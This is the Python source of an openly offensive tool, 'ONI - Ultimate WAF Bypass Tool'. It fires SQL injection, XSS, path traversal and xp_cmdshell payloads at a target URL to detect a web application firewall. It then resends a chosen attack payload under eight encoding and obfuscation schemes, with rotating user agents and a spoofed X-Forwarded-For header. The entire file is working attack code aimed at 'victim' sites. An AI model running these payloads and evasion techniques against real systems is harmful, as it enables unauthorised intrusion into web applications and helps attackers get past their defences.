import requests
import random
import base64
import urllib.parse
import argparse
import time
import sys
import json
from termcolor import colored

print(colored("\nONI - ULTIMATE WAF BYPASS TOOL", "green", attrs=["bold"]))
print(colored("Made by: davycipher\n", "green", attrs=["bold"]))
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

WAF_TEST_PAYLOADS = [
    "' OR 1=1 --",
    "<script>alert(1)</script>",
    "../../etc/passwd",
    "'; EXEC xp_cmdshell('whoami'); --"
]

def base64_encode(payload):
    return base64.b64encode(payload.encode()).decode()

def double_base64(payload):
    return base64.b64encode(base64.b64encode(payload.encode())).decode()

def url_encode(payload):
    return urllib.parse.quote(payload)

def double_url_encode(payload):
    return urllib.parse.quote(urllib.parse.quote(payload))

def case_insensitive(payload):
    return ''.join(random.choice([c.upper(), c.lower()]) for c in payload)

def space_obfuscation(payload):
    return payload.replace(" ", "/**/")

def hex_encode(payload):
    return ''.join(['%' + hex(ord(c))[2:] for c in payload])

def mixed_encoding(payload):
    return url_encode(base64_encode(payload))


BYPASS_METHODS = {
    "Base64": base64_encode,
    "Double Base64": double_base64,
    "URL Encoding": url_encode,
    "Double URL Encoding": double_url_encode,
    "Case Insensitive": case_insensitive,
    "Space Obfuscation": space_obfuscation,
    "Hex Encoding": hex_encode,
    "Mixed Encoding": mixed_encoding
}


def send_request(url, payload):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": "https://google.com",
        "X-Forwarded-For": f"127.0.{random.randint(1, 255)}.{random.randint(1, 255)}"
    }

    results = {}
    print(colored("\nInitiating Oni's Attack...", "green", attrs=["bold"]))
    time.sleep(1)
    
    for method, func in BYPASS_METHODS.items():
        bypass_payload = func(payload)
        print(colored(f"[ {method} Bypass ] ➜ {bypass_payload}", "yellow"))
        time.sleep(0.5)
        
        try:
            response = requests.get(url, headers=headers, params={"input": bypass_payload}, timeout=10)
            results[method] = response.status_code
        except requests.exceptions.RequestException as e:
            results[method] = f"Error: {str(e)}"

    return results


def detect_waf(url):
    print(colored("\nScanning for WAF presence...", "green", attrs=["bold"]))
    time.sleep(1)
    
    for payload in WAF_TEST_PAYLOADS:
        try:
            response = requests.get(url, params={"input": payload}, timeout=10)
            if response.status_code in [403, 406, 501, 502]:
                print(colored(f"WAF Detected! Blocking Status: {response.status_code}", "red", attrs=["bold"]))
                return True
        except requests.exceptions.RequestException:
            print(colored("Connection error!", "red"))
            return False

    print(colored("No WAF Detected (or it's weak). Oni is ready to strike.", "green", attrs=["bold"]))
    return False


def save_results(target, results):
    filename = f"oni_results_{int(time.time())}.json"
    with open(filename, "w") as file:
        json.dump({"target": target, "results": results}, file, indent=4)
    
    print(colored(f"\nResults saved in {filename}", "green"))


def main():
    parser = argparse.ArgumentParser(description="ONI - The Ultimate WAF Slayer")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://victim.com)")
    parser.add_argument("-p", "--payload", required=True, help="Attack payload (e.g., ' OR 1=1 --')")
    parser.add_argument("-o", "--output", action="store_true", help="Save results to file")
    args = parser.parse_args()

    print(colored(f"\nTarget: {args.url}", "green"))


    waf_detected = detect_waf(args.url)

    
    print(colored("\nExecuting Oni's Bypass Techniques...", "green", attrs=["bold"]))
    results = send_request(args.url, args.payload)

    print(colored("\nResults:", "green", attrs=["bold"]))
    for method, status in results.items():
        print(colored(f"[{method}] Status Code: {status}", "yellow"))
    # Save results
    if args.output:
        save_results(args.url, results)

   
    print(colored("\nSummary:", "green", attrs=["bold"]))
    print(colored("Oni successfully tested multiple WAF bypass techniques on the target.", "green"))
    print(colored("Results indicate which techniques were effective in bypassing the WAF.", "green"))
    print(colored("Check the saved results for further analysis.", "green"))

if __name__ == "__main__":
    main()
